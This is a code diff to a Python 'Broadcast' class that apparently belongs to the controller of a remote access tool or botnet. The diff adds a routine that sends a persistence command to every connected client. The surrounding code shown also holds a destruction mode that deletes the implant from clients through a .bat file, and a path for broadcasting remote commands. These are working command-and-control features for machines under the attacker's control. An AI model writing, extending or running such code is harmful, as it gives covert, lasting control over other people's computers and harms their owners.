@@ -60,9 +60,11 @@ class Broadcast:
             
             if not (already_dict) and copy_dict_conn[key][NB_ALIVE] : #Value already existing and now online
                 dict_sorts[key] = copy_dict_conn[key]
+                #print(dict_sorts[key][NB_TOKEN])
 
             already_dict = False #reset 
         
+        #print(dict_sorts)
         return dict_sorts
         
 
@@ -88,14 +90,34 @@ class Broadcast:
         self.broadcast_to_all_clients(cmd) #send command for all client
     
     def persistence_to_all_clients(self):
-        pass
+        
+        dict_sorts = self.aSingleRunMod()
+        
+        printColor("information","\n[!] Are you sure you want to run persistence mode on all clients ? \n")    
+        
+        if(areYouSure()):
+            request = "MOD_PERSISTENCE:broadcast"
+            for key in dict_sorts.keys():
+
+                if(dict_sorts[key][NB_ALIVE]):
+                    if CheckConn().sendsafe(key, dict_sorts[key][NB_SOCKET], request,False): 
+                        printColor("information","[+] The persistence was sent to the client number {} {}:{}".format(dict_sorts[key][NB_SESSION], dict_sorts[key][NB_IP], dict_sorts[key][NB_PORT]))
+
+                    else:
+                        printColor("information","[-] The persistence could not be sent to: {}:{}".format(dict_sorts[key][NB_IP], dict_sorts[key][NB_PORT]))
+                else:
+                    pass
+            else:
+                pass
+
+        
 
     def destruction_for_all_clients(self):
         #Launches a process (.bat file) to delete the program and then exits the program. 
         
         dict_sorts = self.aSingleRunMod()
 
-        printColor("information","\n[!] Are you sure you want to run the destruction mode on all customers ? Once the destruction mode is activated, the clients will no longer be accessible.\nIf you are sure of your choice enter Y if not enter N.\n")
+        printColor("information","[!] Are you sure you want to run the destruction mode on all customers ? Once the destruction mode is activated, the clients will no longer be accessible.\nIf you are sure of your choice enter Y if not enter N.\n")
 
         if(areYouSure()):
             request = "MOD_DESTRUCTION:broadcast"
@@ -122,8 +144,9 @@ class Broadcast:
             pass
 
         time.sleep(2) #Allows to wait for all connections to end (optional)
+        print("\n")
 
-    def disconnection_for_all_clients(self):
+    def disconnection_for_all_clients(self): #coming  soon
         pass
 
     def broadcast_to_all_clients(self, data, whitout_MOD_ALL=False): 
@@ -176,7 +199,7 @@ class Broadcast:
                             self.destruction_for_all_clients()
                         
                         elif(forall[i] == "--persistence"):
-                            self.broadcast_to_all_clients("MOD_PERSISTENCE:broadcast",True)
+                            self.persistence_to_all_clients()
                         
                         elif(forall[i] == "-c"):
                             self.executeCommand(forall)
